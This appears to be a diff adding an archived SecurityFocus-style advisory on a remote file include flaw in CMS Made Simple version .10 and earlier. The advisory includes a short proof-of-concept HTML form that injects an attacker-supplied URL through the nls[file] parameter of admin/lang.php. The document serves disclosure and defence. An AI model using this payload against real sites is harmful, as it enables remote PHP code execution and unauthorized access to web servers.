@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/14709/info
+
+CMS Made Simple is prone to a remote file include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may exploit this issue to execute arbitrary remote PHP code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.
+
+CMS Made Simple Version .10 and all prior versions are reported vulnerable. 
+
+example.html:
+<form action="http://www.example.com/admin/lang.php?CMS_ADMIN_PAGE=1&nls[file][vx][vxsfx]=(__URL__)" method=post>
+<input type=hidden name=change_cms_lang value=vx>
+<input type=submit name=test VALUE="do it">
+</form>
+EOF 
